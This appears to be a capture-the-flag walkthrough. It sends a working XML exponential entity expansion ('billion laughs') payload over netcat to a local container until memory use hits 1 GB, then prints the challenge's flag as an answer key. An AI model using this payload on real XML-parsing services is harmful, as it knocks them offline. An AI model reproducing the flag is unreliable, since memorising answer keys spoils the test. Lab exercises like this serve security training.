# Walkthrough

Step 1. Connect to the container by issuing the following command:
   nc localhost 54321
Step 2. At the prompt for one line of XML, enter the XML on the following line to launch an exponential entity expansion attack:
<?xml version="1.0"?><!DOCTYPE bookshelf [<!ELEMENT bookshelf (book+)><!ELEMENT book (author, name, desc)><!ELEMENT author (#PCDATA)><!ELEMENT name (#PCDATA)><!ELEMENT desc (#PCDATA)><!ENTITY a "payload"><!ENTITY aaaaaaaaaaaaaaaaaaaaa "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY aaaaaaaaaaaaaaaaaaaaaa "&aaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaa;"><!ENTITY aaaaaaaaaaaaaaaaaaaaaaa "&aaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaa;"><!ENTITY aaaaaaaaaaaaaaaaaaaaaaaa "&aaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaa;"><!ENTITY aaaaaaaaaaaaaaaaaaaaaaaaa "&aaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaa;"><!ENTITY aaaaaaaaaaaaaaaaaaaaaaaaaa "&aaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaa;"><!ENTITY aaaaaaaaaaaaaaaaaaaaaaaaaaa "&aaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaa;"><!ENTITY aaaaaaaaaaaaaaaaaaaaaaaaaaaa "&aaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaa;"><!ENTITY aaaaaaaaaaaaaaaaaaaaaaaaaaaaa "&aaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaa;"><!ENTITY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa "&aaaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaaa;">]><bookshelf><book><author>J. K. Rowling</author><name>Harry Potter</name><desc>A story of a boy and his magic powers.</desc></book><book><author>Charles Dickens</author><name>The Tale of Two Cities</name><desc>A story about two cities and friendship.</desc></book><book><author>Anonymous</author><name>XML Exponential Entity Expansion Attack</name><desc>&aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaaa;&aaaaaaaaaaaaaaaaaaaaaaaaaaaa;</desc></book></bookshelf>
When the usage of virtual memory reaches 1 GB, the flag is printed out on the screen.
Answer Key: CTF_Flag{Entity_Expansion_Attack_in_XML}
